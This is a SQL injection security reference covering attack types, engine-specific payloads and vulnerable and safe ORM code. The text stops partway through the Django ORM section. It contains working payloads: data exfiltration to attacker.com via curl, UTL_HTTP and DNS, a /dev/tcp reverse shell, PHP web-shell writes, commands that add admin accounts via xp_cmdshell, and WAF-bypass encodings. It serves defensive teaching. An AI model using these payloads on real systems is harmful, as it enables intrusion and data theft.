# SQL Injection

> **Category:** Security
> **Version:** 1.0.0
> **Status:** Stable
> **Last reviewed:** 2026-06-27
> **OWASP:** A03:2021 — Injection
> **CWE:** CWE-89
> **CVSS (critical instance):** 9.8 (Critical)

---

## Table of Contents

1. [Overview](#1-overview)
2. [History and Context](#2-history-and-context)
3. [How SQL Injection Works](#3-how-sql-injection-works)
4. [Types of SQL Injection](#4-types-of-sql-injection)
   - 4.1 In-Band: Union-Based
   - 4.2 In-Band: Error-Based
   - 4.3 Blind: Boolean-Based
   - 4.4 Blind: Time-Based
   - 4.5 Out-of-Band
   - 4.6 Second-Order (Stored)
5. [SQL Injection by Database Engine](#5-sql-injection-by-database-engine)
   - 5.1 MySQL / MariaDB
   - 5.2 PostgreSQL
   - 5.3 Microsoft SQL Server
   - 5.4 Oracle
   - 5.5 SQLite
6. [SQL Injection in ORMs](#6-sql-injection-in-orms)
   - 6.1 Prisma (TypeScript)
   - 6.2 Drizzle (TypeScript)
   - 6.3 TypeORM (TypeScript)
   - 6.4 Sequelize (JavaScript)
   - 6.5 SQLAlchemy (Python)
   - 6.6 Django ORM (Python)
   - 6.7 Hibernate (Java)
   - 6.8 Entity Framework (C#)
   - 6.9 ActiveRecord (Ruby)
7. [Defense Mechanisms](#7-defense-mechanisms)
   - 7.1 Parameterized Queries
   - 7.2 Stored Procedures
   - 7.3 Input Validation and Allowlisting
   - 7.4 Principle of Least Privilege
   - 7.5 Dynamic SQL — Safe Patterns
8. [WAF — Web Application Firewall](#8-waf--web-application-firewall)
9. [RASP — Runtime Application Self-Protection](#9-rasp--runtime-application-self-protection)
10. [Logging and Monitoring](#10-logging-and-monitoring)
11. [Detection and Penetration Testing](#11-detection-and-penetration-testing)
    - 11.1 Manual Testing
    - 11.2 Automated Tools
    - 11.3 Sqlmap — Comprehensive Guide
12. [Vulnerable Code Examples](#12-vulnerable-code-examples)
13. [Secure Code Examples](#13-secure-code-examples)
14. [Anti-Patterns](#14-anti-patterns)
15. [Threat Model](#15-threat-model)
16. [Performance Considerations](#16-performance-considerations)
17. [Compliance Mapping](#17-compliance-mapping)
18. [Checklist](#18-checklist)
19. [References](#19-references)

---

## 1. Overview

SQL Injection (SQLi) is a code injection technique where an attacker manipulates a SQL query by inserting or "injecting" malicious SQL code through user-controlled input. When successful, the attacker can:

- **Read** sensitive data from the database (usernames, passwords, payment data, PII)
- **Modify** data (change prices, alter records, create fake entries)
- **Delete** data (drop tables, truncate records)
- **Execute** administrative database operations (shutdown, write files)
- **Execute** operating system commands (in some configurations)
- **Bypass** authentication entirely
- **Escalate privileges** within the application

SQL Injection has been in the OWASP Top 10 every single year since its creation in 2003. Despite being a fully understood, fully solvable problem with well-documented mitigations, it remains one of the most commonly exploited vulnerabilities in production systems in 2025.

**Why it still exists:**
- Developers learn to build features before they learn to build them securely
- Legacy codebases predate ORM adoption
- ORMs have escape hatches (`.raw()`, `.literal()`, template literals) that are misused
- Developers assume frameworks protect them without verifying
- Code review misses string concatenation in obscure query paths
- Dynamic SQL requirements lead to unsafe patterns

---

## 2. History and Context

### Timeline

| Year | Event |
|---|---|
| 1998 | Jeff Forristal (rain.forest.puppy) publishes the first documented SQL Injection article in Phrack Magazine (#54) |
| 1999 | SQL injection as a term enters security literature |
| 2002 | OWASP is founded; SQL Injection appears in first Top 10 list |
| 2005 | SQLMap (first version) released — automated SQLi exploitation begins |
| 2007 | Monster.com breach — 1.3 million records stolen via SQLi |
| 2008 | Mass SQL Injection attacks infect 500,000+ web pages via automated tools |
| 2009 | Heartland Payment Systems — 130 million credit card numbers stolen via SQLi |
| 2011 | Sony PlayStation Network — 77 million accounts via SQLi |
| 2012 | LinkedIn — 6.5 million password hashes via SQLi |
| 2014 | US Office of Personnel Management begins being compromised via SQLi (discovered 2015) |
| 2017 | Equifax breach — 147 million Americans' data stolen |
| 2019 | Collection #1 — 773 million records include SQLi-sourced credentials |
| 2021 | OWASP A03:2021 — Injection (includes SQLi) remains in Top 3 |
| 2023–2025 | MOVEit Transfer, Progress Software, and numerous SaaS providers hit by SQLi variants |

### The Economics of SQL Injection

SQL Injection attacks are economically dominant because:
- **Attack cost:** ~$0 (automated tools, public exploits)
- **Defense cost:** ~$0 (parameterized queries are free)
- **Breach cost:** $4.45M average (IBM Cost of Data Breach Report 2023)

The cost asymmetry is total. An attacker with a laptop and SQLMap can automate scanning millions of endpoints. The fix takes a developer 10 minutes.

---

## 3. How SQL Injection Works

### The Fundamental Mechanism

A SQL query is a program. When a web application constructs a SQL program by concatenating user input into a string, the user's input becomes part of the program itself — not merely data within it.

Consider a login form:

```sql
-- The intended query
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
```

If the application constructs this by concatenation:

```python
# Python — VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

An attacker enters `username = admin'--` and any password:

```sql
-- What the database executes
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
--                                          ^^ SQL comment — everything after is ignored
```

The `--` is a SQL comment. The password check is eliminated. The attacker is authenticated as `admin` without knowing the password.

### Why Databases Execute It

Databases do not distinguish between "SQL the developer wrote" and "SQL that came from user input." The database receives a byte stream and parses it as SQL. It has no way to know that part of the query was user-supplied unless the application explicitly separates data from structure using parameterized queries.

### The Anatomy of an Injection Point

An injection point is any location where user-controlled data is incorporated into a SQL query. Common locations:

| Location | Example |
|---|---|
| GET parameter | `GET /users?id=1` |
| POST body | `{"username": "alice"}` |
| HTTP header | `User-Agent`, `X-Forwarded-For`, `Referer` |
| Cookie | `session_id=abc123` |
| JSON/XML body | Nested values parsed and used in queries |
| Path parameter | `/users/123/orders` |
| Search input | `/search?q=keyword` |
| Sort/order parameter | `?sort=name&dir=asc` |
| File upload metadata | Filename, description |
| WebSocket message | Any structured message with query-influencing fields |

---

## 4. Types of SQL Injection

### 4.1 In-Band: Union-Based

**Definition:** The attacker uses the `UNION` SQL operator to append a second `SELECT` statement to the original query. The results of the attacker's query are returned in the application's HTTP response.

**Requirement:** The number and data types of columns in the injected `SELECT` must match the original query.

**Step 1: Determine column count**
```sql
-- Inject ORDER BY clauses until an error occurs
ORDER BY 1--    -- no error
ORDER BY 2--    -- no error
ORDER BY 3--    -- error → query has 2 columns
```

**Step 2: Determine which columns are displayed**
```sql
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
```

**Step 3: Extract data**
```sql
-- Extract table names
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Extract column names from a specific table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--

-- Extract credentials
' UNION SELECT username, password FROM users--

-- Concatenate multiple values into one column
' UNION SELECT username || ':' || password, NULL FROM users--
```

**Database detection via Union-Based:**
```sql
-- MySQL
' UNION SELECT @@version, NULL--

-- PostgreSQL
' UNION SELECT version(), NULL--

-- MSSQL
' UNION SELECT @@version, NULL--

-- Oracle (requires FROM clause)
' UNION SELECT banner, NULL FROM v$version--
```

---

### 4.2 In-Band: Error-Based

**Definition:** The attacker triggers intentional database errors that contain useful information in the error message. The error message is returned in the HTTP response.

This technique works when:
- The application displays database error messages directly
- The application logs errors to a location the attacker can read

**MySQL Error-Based:**
```sql
-- extractvalue() forces an error with the query result embedded
' AND extractvalue(1, concat(0x7e, (SELECT database())))--
-- Error: XPATH syntax error: '~target_database_name'

-- updatexml() alternative
' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--
```

**PostgreSQL Error-Based:**
```sql
-- Cast error forces the value into the error message
' AND CAST((SELECT version()) AS INTEGER)--
-- Error: invalid input syntax for type integer: "PostgreSQL 14.1..."

-- Error in WHERE clause
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)--
```

**MSSQL Error-Based:**
```sql
-- Convert forces a type conversion error
' AND CONVERT(INT, (SELECT TOP 1 username FROM users))--
-- Error: Conversion failed when converting the varchar value 'admin' to data type int.
```

**Oracle Error-Based:**
```sql
-- UTL_HTTP or DBMS_UTILITY errors
' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--
```

---

### 4.3 Blind: Boolean-Based

**Definition:** The application does not return query results or error messages, but its behavior differs based on whether the injected condition is true or false. The attacker extracts data one bit at a time by observing application behavior.

**Observable differences:**
- Page shows content (true) vs. shows nothing or error (false)
- HTTP 200 vs. HTTP 404/500
- Different response body (user found vs. user not found)
- Different response length

**Step-by-step data extraction:**

```sql
-- Is the first character of the database name 'a'?
' AND SUBSTRING(database(), 1, 1) = 'a'--   -- False → nothing shown
' AND SUBSTRING(database(), 1, 1) = 'b'--   -- False
...
' AND SUBSTRING(database(), 1, 1) = 'p'--   -- True → content shown → first char is 'p'

-- Is the second character 'r'?
' AND SUBSTRING(database(), 2, 1) = 'r'--   -- True

-- Binary search (more efficient)
' AND ASCII(SUBSTRING(database(), 1, 1)) > 77--   -- True → char > 'M'
' AND ASCII(SUBSTRING(database(), 1, 1)) > 109--  -- True → char > 'm'
' AND ASCII(SUBSTRING(database(), 1, 1)) > 112--  -- False → char ≤ 'p'
' AND ASCII(SUBSTRING(database(), 1, 1)) = 112--  -- True → char is 'p'
```

**Counting records:**
```sql
' AND (SELECT COUNT(*) FROM users) > 10--    -- True or false
' AND (SELECT COUNT(*) FROM users) = 15--    -- Find exact count
```

**Extracting password hash character by character:**
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 36--
-- 36 = '$' → first char of bcrypt hash '$2b$...'
```

This process extracts data byte by byte. Automated tools (SQLMap) do this efficiently using binary search, reducing character extraction to ~7 requests per character.

---

### 4.4 Blind: Time-Based

**Definition:** No visible difference in application behavior. The attacker uses database time delay functions to infer true/false conditions. If the condition is true → delay; if false → immediate response.

**MySQL:**
```sql
-- If the first character of the database is 'p', wait 5 seconds
' AND IF(SUBSTRING(database(),1,1)='p', SLEEP(5), 0)--

-- Check user privileges
' AND IF((SELECT super_priv FROM mysql.user WHERE user='root') = 'Y', SLEEP(5), 0)--
```

**PostgreSQL:**
```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--

-- Extract data
' AND 1=(SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--
```

**MSSQL:**
```sql
'; IF (SUBSTRING(db_name(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- Check if sa user
'; IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 WAITFOR DELAY '0:0:5'--
```

**Oracle:**
```sql
-- Oracle uses DBMS_PIPE or heavy queries for delays
' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM DUAL)--
-- Or use a heavy query that takes time
```

**Defense evasion — WAF bypass via timing variations:**
```sql
-- Spread delay across iterations to evade threshold detection
' AND IF(1=1, SLEEP(0.5), 0)--
```

**Time-based precision issues:**
- Network latency introduces noise → use delays ≥ 3 seconds
- Server load affects timing → use multiple requests to confirm
- HTTP keep-alive connections affect timing measurement

---

### 4.5 Out-of-Band (OOB)

**Definition:** Data is exfiltrated through a side channel — DNS lookups, HTTP requests, or file writes — rather than through the application's HTTP response. This is used when in-band and blind techniques are blocked or impractical.

**Requirement:** The database server must be able to make outbound network connections. This is often blocked in well-hardened environments but remains common in legacy deployments.

**MySQL — DNS Exfiltration via LOAD_FILE:**
```sql
-- Requires FILE privilege and a writable directory
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--

-- MySQL's load_file with UNC path triggers a DNS lookup to attacker.com
-- subdomain = password value
```

**MSSQL — xp_cmdshell and DNS:**
```sql
-- Requires xp_cmdshell enabled (disabled by default in modern SQL Server)
'; EXEC xp_cmdshell('nslookup ' + (SELECT TOP 1 password FROM users) + '.attacker.com')--

-- MSSQL OOB via linked server
'; DECLARE @q NVARCHAR(200); SET @q = 'SELECT * FROM openrowset(''SQLNCLI'',''server=attacker.com;uid=a;pwd=a'',''SELECT 1'')'; EXEC(@q)--
```

**PostgreSQL — COPY TO and curl:**
```sql
-- Write query results to a file
'; COPY (SELECT password FROM users) TO '/tmp/pwds.txt'--

-- Use COPY to trigger a network connection
'; COPY users TO PROGRAM 'curl http://attacker.com/?data=' || (SELECT password FROM users LIMIT 1)--
```

**Oracle — UTL_HTTP:**
```sql
-- Oracle's UTL_HTTP package makes HTTP requests
' AND UTL_HTTP.REQUEST('http://attacker.com/?'||(SELECT password FROM users WHERE rownum=1)) IS NOT NULL--

-- UTL_FILE for file writes
' AND UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/tmp','out.txt','W'), (SELECT password FROM users WHERE rownum=1), TRUE) IS NOT NULL--
```

**DNS-based OOB (most reliable — works even through firewalls):**
```sql
-- MySQL with Burp Collaborator
' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.burpcollaborator.net\\a'))--

-- The DNS query contains the hex-encoded password in the subdomain
-- Captured by Burp Collaborator or a custom DNS server (interactsh, dnscat2)
```

**When OOB is the only option:**
- Response does not change (no in-band channel)
- Time-based is too noisy (high latency, variable server load)
- WAF blocks response-based payloads but not DNS traffic
- Rate limiting makes character-by-character extraction impractical

---

### 4.6 Second-Order (Stored) SQL Injection

**Definition:** The malicious SQL is stored safely in the database on input (because it is parameterized at input time), but is later retrieved and incorporated unsafely into a SQL query at retrieval time.

This is the most dangerous variant because:
- The input endpoint appears secure (uses parameterized queries)
- The vulnerability manifests far from the injection point
- Code reviewers check input handling but miss retrieval handling
- Automated scanners miss it entirely

**Scenario:**

Step 1: User registers with username `admin'--`
```python
# Registration — SAFE (parameterized)
cursor.execute("INSERT INTO users (username, password) VALUES (%s, %s)", 
               (username, hashed_password))
# username = "admin'--" is stored safely as a literal string
```

Step 2: Password change feature retrieves the username and uses it unsafely
```python
# Password change — VULNERABLE
username = get_current_user_username()  # returns: admin'--
cursor.execute("UPDATE users SET password = '" + new_password + 
               "' WHERE username = '" + username + "'")
# Executed: UPDATE users SET password = 'x' WHERE username = 'admin'--'
# The password is changed for 'admin', not 'admin'--'
```

**Real-world example — account takeover:**

1. Attacker registers username: `victim_admin'--`
2. Attacker changes their own password to `hacked123`
3. The UPDATE query executes: `UPDATE users SET password = 'hacked123' WHERE username = 'victim_admin'--'`
4. The `--` comments out the rest — victim_admin's password is now `hacked123`
5. Attacker logs in as `victim_admin` with `hacked123`

**Finding Second-Order Injection:**
- Trace every data retrieval path, not just every input path
- Search for queries that use values retrieved FROM the database (not just from the request)
- Pay special attention to: username fields, email addresses, display names, any "editable profile field"

---

## 5. SQL Injection by Database Engine

Each database engine has its own syntax, functions, and capabilities. Understanding per-engine behavior is essential for both exploitation and defense.

### 5.1 MySQL / MariaDB

**Version detection:**
```sql
SELECT @@version;            -- e.g., 8.0.32
SELECT @@global.version;
SELECT version();
```

**Current user and privileges:**
```sql
SELECT user();               -- current user
SELECT current_user();
SELECT CURRENT_USER;
SELECT super_priv FROM mysql.user WHERE user = user();
```

**Database enumeration:**
```sql
SELECT schema_name FROM information_schema.schemata;
SELECT database();           -- current database
```

**Table and column enumeration:**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

**File read (requires FILE privilege):**
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

**File write (requires FILE privilege and writable path):**
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-- This creates a web shell if web root is writable
```

**String concatenation:**
```sql
SELECT CONCAT(username, ':', password) FROM users;
SELECT GROUP_CONCAT(username ORDER BY username SEPARATOR ',') FROM users;
```

**Stacked queries:** MySQL supports stacked queries only through certain interfaces (PDO with `PDO::MYSQL_ATTR_MULTI_STATEMENTS`, not MySQLi by default). The `mysqli_multi_query()` function enables them.

**Comment syntax:**
```sql
-- comment (single dash space)
# comment
/* comment */
/*!50000 version-specific comment */
```

**WAF bypass techniques (MySQL):**
```sql
-- Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users   -- tab
SELECT%0ausername%0aFROM%0ausers   -- newline

-- Case variation
SeLeCt UsErNaMe FrOm UsErS

-- Inline comments to break keywords
SE/**/LECT user FROM users
UN/**/ION SE/**/LECT 1,2

-- URL encoding
%53%45%4c%45%43%54 = SELECT

-- Double encoding
%2553%2545%254c%2545%2543%2554 = SELECT (if application double-decodes)
```

---

### 5.2 PostgreSQL

PostgreSQL is notably powerful for attackers due to its extensive function library and ability to execute OS commands via `COPY TO PROGRAM`.

**Version and user:**
```sql
SELECT version();
SELECT current_user;
SELECT session_user;
SELECT pg_postmaster_start_time();
```

**Privilege check:**
```sql
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- Returns 't' for superuser
```

**Database and table enumeration:**
```sql
SELECT datname FROM pg_database;
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

**OS command execution (superuser only):**
```sql
-- Write a file
COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';

-- Read command output
CREATE TABLE cmd_output (output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
```

**UDF (User Defined Function) for RCE:**
```sql
-- Load a shared library
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id > /tmp/id.txt');
```

**Large Objects for file read:**
```sql
SELECT lo_import('/etc/passwd');    -- returns OID
SELECT lo_get(OID);                 -- read file contents
```

**String functions:**
```sql
SELECT string_agg(username || ':' || password, ', ') FROM users;
SELECT chr(65);                      -- 'A' (useful for bypassing WAF)
SELECT encode(password::bytea, 'hex') FROM users;
```

**Comment syntax:**
```sql
-- comment
/* comment */
```

**PostgreSQL-specific stacked queries:** Supported natively. Every statement is stacked by default with semicolons.

---

### 5.3 Microsoft SQL Server

MSSQL has the richest OS integration of any major database, making it particularly dangerous when compromised.

**Version and configuration:**
```sql
SELECT @@version;
SELECT @@servername;
SELECT @@servicename;
SELECT db_name();
```

**Privilege check:**
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = true
SELECT IS_MEMBER('db_owner');
SELECT system_user;
SELECT suser_sname();
```

**Database enumeration:**
```sql
SELECT name FROM master.sys.databases;
SELECT name FROM sysobjects WHERE xtype='U';     -- user tables
SELECT name FROM syscolumns WHERE id = OBJECT_ID('users');
```

**xp_cmdshell (disabled by default, but re-enableable by sysadmin):**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Password123! /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
```

**Linked servers for lateral movement:**
```sql
SELECT * FROM OPENROWSET('SQLNCLI', 'server=internal-server;uid=sa;pwd=password', 'SELECT * FROM users')
```

**Stacked queries:** Always supported via the `; ` separator.

**BULK INSERT for file read:**
```sql
CREATE TABLE readfile (line VARCHAR(8000));
BULK INSERT readfile FROM 'C:\Windows\win.ini';
SELECT * FROM readfile;
```

**WAITFOR for time-based blind:**
```sql
IF (1=1) WAITFOR DELAY '0:0:5'
IF (SELECT LEN(db_name())) > 5 WAITFOR DELAY '0:0:5'
```

---

### 5.4 Oracle

Oracle is common in enterprise environments (banking, government, healthcare).

**Version and user:**
```sql
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT user FROM dual;
SELECT username, account_status FROM dba_users;
```

**Note:** Oracle requires a `FROM` clause in every `SELECT`, so use `FROM DUAL` for constant expressions:
```sql
SELECT 1 FROM DUAL;           -- valid
SELECT 1;                     -- INVALID in Oracle
```

**Table enumeration:**
```sql
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;      -- current user's tables
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
```

**Concatenation (Oracle uses `||`, not CONCAT for multiple strings):**
```sql
SELECT username || ':' || password FROM users;
SELECT listagg(username, ',') WITHIN GROUP (ORDER BY username) FROM users;
```

**UTL_HTTP for OOB:**
```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM users WHERE rownum=1)) FROM DUAL;
```

**Error-based:**
```sql
-- CTXSYS.DRITHSX.SN technique
SELECT CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE rownum=1)) FROM DUAL;
```

---

### 5.5 SQLite

SQLite is common in mobile apps, embedded systems, and smaller web applications.

**Version and metadata:**
```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';    -- get table schema
```

**File operations (via writefile/readfile extensions):**
```sql
SELECT writefile('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>');
```

**Limited but still dangerous:**
SQLite lacks the OS integration of MySQL/PostgreSQL/MSSQL, but still allows full data exfiltration and manipulation.

---

## 6. SQL Injection in ORMs

ORMs are not immune to SQL injection. They provide safe defaults but also expose escape hatches. Every ORM has at least one way to write raw SQL — and that is always the injection vector.

### 6.1 Prisma (TypeScript)

**Safe by default (parameterized):**
```typescript
// SAFE — Prisma parameterizes all values automatically
const user = await prisma.user.findFirst({
  where: { email: userInput }
})

const users = await prisma.user.findMany({
  where: {
    name: { contains: searchInput }
  }
})
```

**The injection vector — `$queryRaw` and `$executeRaw`:**
```typescript
// VULNERABLE — string interpolation in $queryRaw
const users = await prisma.$queryRaw`SELECT * FROM users WHERE name = '${userInput}'`
// Wait — this looks like a template literal, is it safe?

// The answer depends on HOW you use it:

// SAFE — Prisma's tagged template literal (the backtick syntax)
const users = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${userInput}`
// Prisma automatically parameterizes values in tagged template literals

// VULNERABLE — string concatenation inside $queryRaw
const users = await prisma.$queryRaw(
  `SELECT * FROM users WHERE name = '${userInput}'`  // NOT a tagged literal
)

// ALSO VULNERABLE — $queryRawUnsafe
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE name = '${userInput}'`
)
```

**Dynamic ORDER BY (a common real-world case):**
```typescript
// VULNERABLE — dynamic column names cannot be parameterized
const column = req.query.sort_by  // attacker controls this
const users = await prisma.$queryRaw`SELECT * FROM users ORDER BY ${column}`
// This DOES NOT escape the column name — it injects it directly

// CORRECT — allowlist approach
const ALLOWED_SORT_COLUMNS = ['name', 'email', 'created_at'] as const
type SortColumn = typeof ALLOWED_SORT_COLUMNS[number]

function isSortColumn(value: string): value is SortColumn {
  return (ALLOWED_SORT_COLUMNS as readonly string[]).includes(value)
}

const sortColumn = req.query.sort_by
if (!isSortColumn(sortColumn)) {
  throw new Error('Invalid sort column')
}

// Use Prisma.sql for identifier escaping
const users = await prisma.$queryRaw`SELECT * FROM users ORDER BY ${Prisma.sql([sortColumn])}`

// OR use Prisma's orderBy API which handles this safely
const users = await prisma.user.findMany({
  orderBy: { [sortColumn]: 'asc' }  // Prisma validates keys against the schema
})
```

**Prisma's `Prisma.sql` helper for safe raw queries:**
```typescript
import { Prisma } from '@prisma/client'

// Build dynamic queries safely
const conditions: Prisma.Sql[] = []

if (filter.name) {
  conditions.push(Prisma.sql`name ILIKE ${`%${filter.name}%`}`)
}
if (filter.status) {
  conditions.push(Prisma.sql`status = ${filter.status}`)
}

const whereClause = conditions.length > 0
  ? Prisma.sql`WHERE ${Prisma.join(conditions, ' AND ')}`
  : Prisma.empty

const users = await prisma.$queryRaw`SELECT * FROM users ${whereClause}`
```

---

### 6.2 Drizzle (TypeScript)

**Safe by default:**
```typescript
// SAFE — Drizzle parameterizes values
const result = await db
  .select()
  .from(users)
  .where(eq(users.email, userInput))
```

**The injection vector — `sql` template tag misuse:**
```typescript
import { sql } from 'drizzle-orm'

// SAFE — sql tagged template literal
const result = await db.execute(sql`SELECT * FROM users WHERE email = ${userInput}`)

// VULNERABLE — string concatenation (bypasses the template tag safety)
const column = req.query.sort    // user-controlled
const result = await db.execute(sql.raw(`SELECT * FROM users ORDER BY ${column}`))
// sql.raw() does NOT escape — it treats input as literal SQL

// CORRECT — dynamic column with allowlist
const SORTABLE = { name: users.name, email: users.email, created_at: users.createdAt }
const sortColumn = SORTABLE[req.query.sort as keyof typeof SORTABLE]
if (!sortColumn) throw new Error('Invalid sort field')

const result = await db.select().from(users).orderBy(asc(sortColumn))
```

---

### 6.3 TypeORM (TypeScript)

TypeORM has more injection vectors than Prisma or Drizzle because of its flexible query builder.

**Safe patterns:**
```typescript
// SAFE — object syntax
const user = await userRepository.findOne({
  where: { email: userInput }
})

// SAFE — query builder with parameters
const users = await userRepository
  .createQueryBuilder('user')
  .where('user.email = :email', { email: userInput })
  .getMany()
```

**Common injection vectors:**

```typescript
// VULNERABLE — find() with query object (FindOperator injection)
const users = await userRepository.find({
  where: { role: req.body.role }  // attacker sends { role: { $or: [true] } } → type confusion
})

// VULNERABLE — direct string interpolation in QueryBuilder
const users = await userRepository
  .createQueryBuilder('user')
  .where(`user.name = '${req.query.name}'`)  // VULNERABLE
  .getMany()

// VULNERABLE — .query() with string concatenation
const result = await dataSource.query(
  `SELECT * FROM users WHERE email = '${email}'`  // VULNERABLE
)

// CORRECT — .query() with parameterized values
const result = await dataSource.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
)

// VULNERABLE — dynamic ORDER BY
const sortField = req.query.sort    // user-controlled
const users = await userRepository
  .createQueryBuilder('user')
  .orderBy(`user.${sortField}`, 'ASC')  // VULNERABLE — sortField is not escaped
  .getMany()

// CORRECT — allowlist
const ALLOWED_FIELDS = ['name', 'email', 'createdAt']
if (!ALLOWED_FIELDS.includes(sortField)) throw new Error('Invalid sort field')
const users = await userRepository
  .createQueryBuilder('user')
  .orderBy(`user.${sortField}`, 'ASC')  // Now safe because sortField is allowlisted
  .getMany()
```

**Mass assignment via TypeORM:**
```typescript
// VULNERABLE — mass assignment
const user = userRepository.create(req.body)  // attacker can set any column
await userRepository.save(user)

// CORRECT — explicit field allowlist
const user = userRepository.create({
  name: req.body.name,
  email: req.body.email,
  // role: not here — user cannot set their own role
})
await userRepository.save(user)
```

---

### 6.4 Sequelize (JavaScript)

Sequelize is one of the older Node.js ORMs and has many injection vectors.

**Safe patterns:**
```javascript
// SAFE — model methods parameterize automatically
const user = await User.findOne({ where: { email: userInput } })

// SAFE — literal with named parameters
const users = await User.findAll({
  where: sequelize.literal('email = :email'),
  replacements: { email: userInput }
})
```

**Injection vectors:**

```javascript
// VULNERABLE — object injection (prototype pollution risk)
// Attacker sends: { email: { [Op.or]: [true] } }
// This bypasses the WHERE clause entirely
const users = await User.findAll({
  where: req.body  // NEVER pass req.body directly to findAll
})

// VULNERABLE — LIKE without escaping
const users = await User.findAll({
  where: { name: { [Op.like]: `%${req.query.search}%` } }
  // If search = '%', returns all users
  // If search = '%' OR 1=1--, depends on driver
})

// CORRECT — LIKE with safe construction
const search = req.query.search.replace(/%/g, '\\%').replace(/_/g, '\\_')
const users = await User.findAll({
  where: { name: { [Op.like]: `%${search}%` } }
})

// VULNERABLE — raw queries
const [results] = await sequelize.query(
  `SELECT * FROM users WHERE email = '${email}'`  // VULNERABLE
)

// CORRECT — replacements
const [results] = await sequelize.query(
  'SELECT * FROM users WHERE email = :email',
  { replacements: { email } }
)

// OR bind parameters
const [results] = await sequelize.query(
  'SELECT * FROM users WHERE email = $email',
  { bind: { email } }
)

// VULNERABLE — ORDER BY with user input
const users = await User.findAll({
  order: [[req.query.column, req.query.direction]]  // VULNERABLE
})

// CORRECT — allowlist
const COLUMNS = ['name', 'email', 'createdAt']
const DIRECTIONS = ['ASC', 'DESC']
if (!COLUMNS.includes(column) || !DIRECTIONS.includes(direction)) {
  throw new Error('Invalid sort parameters')
}
const users = await User.findAll({
  order: [[column, direction]]
})
```

---

### 6.5 SQLAlchemy (Python)

**Safe patterns:**
```python
# SAFE — ORM queries with bound parameters
user = session.query(User).filter(User.email == user_input).first()

# SAFE — Core API with text() and bindparams
from sqlalchemy import text
result = session.execute(
    text("SELECT * FROM users WHERE email = :email"),
    {"email": user_input}
)
```

**Injection vectors:**

```python
# VULNERABLE — string interpolation in text()
user_input = "' OR '1'='1"
result = session.execute(
    text(f"SELECT * FROM users WHERE email = '{user_input}'")  # VULNERABLE
)

# VULNERABLE — filter() with raw SQL fragments
result = session.query(User).filter(
    f"email = '{user_input}'"  # VULNERABLE — passes raw string to SQL
)

# VULNERABLE — connection.execute() with string concatenation
conn.execute(f"SELECT * FROM users WHERE email = '{user_input}'")  # VULNERABLE

# VULNERABLE — dynamic ORDER BY
column = request.args.get('sort')
result = session.query(User).order_by(text(column))  # VULNERABLE

# CORRECT — dynamic ORDER BY with allowlist
ALLOWED_COLUMNS = {'name': User.name, 'email': User.email, 'created_at': User.created_at}
column_name = request.args.get('sort', 'created_at')
column = ALLOWED_COLUMNS.get(column_name)
if column is None:
    raise ValueError('Invalid sort column')
result = session.query(User).order_by(column).all()
```

---

### 6.6 Django ORM (Python)

Django ORM is one of the safest by default, but raw() and extra() are injection vectors.

**Safe patterns:**
```python
# SAFE — Django ORM parameterizes everything
users = User.objects.filter(email=user_input)
users = User.objects.filter(name__icontains=search_input)
```

**Injection vectors:**

```python
# VULNERABLE — raw() with string interpolation
users = User.objects.raw(
    f"SELECT * FROM auth_user WHERE email = '{user_input}'"  # VULNERABLE
)

